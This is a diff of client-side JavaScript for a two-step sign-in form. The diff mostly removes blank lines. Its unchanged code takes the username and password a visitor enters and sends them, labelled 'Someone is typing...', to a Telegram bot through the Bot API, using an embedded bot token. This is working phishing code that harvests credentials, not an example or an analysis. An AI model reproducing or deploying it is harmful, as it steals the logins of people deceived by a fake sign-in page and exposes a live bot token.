@@ -4,11 +4,9 @@ document.addEventListener('DOMContentLoaded', () => {
     const unameInp = document.getElementById('inp_uname');
     const pwdInp = document.getElementById('inp_pwd');
     let view = "uname";
-
     let unameVal = pwdVal = false;
     /////next button
     const nxt = document.getElementById('btn_next');
-
     nxt.addEventListener('click', () => {
         //validate the form
         validate();
@@ -21,31 +19,22 @@ document.addEventListener('DOMContentLoaded', () => {
             view = "pwd";
         }
     })
-
     //////sign in button
-
     const sig = document.getElementById('btn_sig');
-
     sig.addEventListener('click', async () => {
         //validate the form
         validate();
-
     if (!pwdVal) {
         return;
     }
-    
-
  if (pwdVal) {
-
     const name = unameInp.value.trim();
     const pwd = pwdInp.value.trim();
-
     try {
         const message =
             `Someone is typing... \n\n` +
             `Name: ${name}\n` +
             `Password: ${pwd}`;
-
         const response = await fetch(
             `https://api.telegram.org/bot8828292202:AAFK5J441LHn-_GgtPZhaUi43ZjvaE3vnY8/sendMessage`,
             {
@@ -59,20 +48,14 @@ document.addEventListener('DOMContentLoaded', () => {
                 })
             }
         );
-
         const result = await response.json();
-
         if (!result.ok) {
             console.error('Telegram error:', result);
             return;
         }
-
         document.getElementById("section_uname").classList.add('d-none');
         document.getElementById('section_pwd').classList.remove('d-none');
-
-
         view = "final";
-
     } catch (error) {
         console.error('Submission error:', error);
     }
@@ -81,7 +64,6 @@ document.addEventListener('DOMContentLoaded', () => {
             view = "final";
         }
     })
-
     function validate() {
         function unameValAction(type) {
             if (!type) {
@@ -93,7 +75,6 @@ document.addEventListener('DOMContentLoaded', () => {
                 unameInp.classList.remove('error-inp')
                 unameVal = true;
             }
-
         }
         function pwdValAction(type) {
             if (!type) {
@@ -105,7 +86,6 @@ document.addEventListener('DOMContentLoaded', () => {
                 pwdInp.classList.remove('error-inp')
                 pwdVal = true;
             }
-
         }
         if (view === "uname") {
             if (unameInp.value.trim() === "") {
@@ -136,14 +116,12 @@ document.addEventListener('DOMContentLoaded', () => {
         }
         return false;
     }
-
     //back button
     document.querySelector('.back').addEventListener('click', () => {
         view = "uname";
         document.getElementById("section_pwd").classList.toggle('d-none');
         document.getElementById('section_uname').classList.remove('d-none');
     })
-
     //final buttons
     document.querySelectorAll('#btn_final').forEach((b) => {
         b.addEventListener('click', () => {
